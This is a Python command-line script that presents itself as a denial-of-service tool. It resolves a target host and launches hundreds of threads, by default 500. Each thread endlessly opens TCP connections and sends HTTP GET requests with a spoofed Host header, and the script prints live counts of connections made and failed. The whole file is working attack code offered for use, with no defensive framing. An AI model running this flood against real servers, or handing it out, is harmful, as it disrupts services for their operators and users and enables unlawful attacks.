#!/bin/python3
import threading
import socket
import time
import sys
from datetime import datetime

global target, port, threads
if len(sys.argv) == 2:
    if sys.argv[1] == "--help":
        print("""
 -------------------------------------
 DoS script by rysecx
 version 1.0.1
 -------------------------------------
 Usage: -t [target] -p [port] -th [threads]
 Only target is required
 Default port:80 | Default threads:500
 -------------------------------------
 		""")
        sys.exit()
    else:
        print("Error. Wrong input. Usage: -t [target] -p [port] -th [threads] | Only target is 	required")

elif len(sys.argv) == 3:
    if sys.argv[1] == "-t":
        target = socket.gethostbyname(sys.argv[2])
        port = 80
        threads = 500
    else:
        print("Error. Wrong input. Usage: -t [target] -p [port] -th [threads] | Only target is 	required")
        sys.exit()


elif len(sys.argv) == 5:
    if sys.argv[1] == "-t" and sys.argv[3] == "-p":
        target = socket.gethostbyname(sys.argv[2])
        port_str = sys.argv[4]
        port = int(port_str)
        threads = 500
    else:
        print("Error. Wrong input. Usage: -t [target] -p [port] -th [threads] | Only target is 	required")
        sys.exit()

elif len(sys.argv) == 7:
    if sys.argv[1] == "-t" and sys.argv[3] == "-p" and sys.argv[5] == "-th":
        target = socket.gethostbyname(sys.argv[2])
        port_str = sys.argv[4]
        port = int(port_str)
        threads_str = sys.argv[6]
        threads = int(threads_str)
    else:
        print("Error. Wrong input. Usage: -t [target] -p [port] -th [threads] | Only target is 	required")
        sys.exit()
else:
    print("Error. Wrong input. Usage: -t [target] -p [port] -th [threads] | Only target is 	required")
    sys.exit()

fake_ip = '188.10.54.12'
already_connected = 0
failed_conn = 0


def countdown(c):
    time.sleep(1)
    print(c, "s")


def countdown(c):
    time.sleep(1)
    print("DoS attack starts in", c, "s", end="\r")
print("-" * 50)
print("DoS script by John Ryder. v.1.0.1")
print("Target : ", target)
print("Port: ", port)
print("Threads: ", threads)
print("Datetime: ", str(datetime.now()))
print("-" * 50)
print(" ")
c = 3
for x in range(4):
    countdown(c)
    c -= 1

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()

            global already_connected
            already_connected += 1
            con = str(already_connected)
            print(" (", con, ")  threads connected.", end="\r")

        except KeyboardInterrupt:
            print("\nDDOS shut down...")
            sys.exit()

        except socket.error:
            global failed_conn
            failed_conn += 1
            print(" (", failed_conn, ") connections failed!", end="\r")

        except NameError:
            print("")


for _ in range(threads):
    thread = threading.Thread(target=attack)
    thread.daemon = True
    try:
        thread.start()

    except KeyboardInterrupt:
        thread.join()
        print("threads closed.")
        print("script shut down...")
        sys.exit()





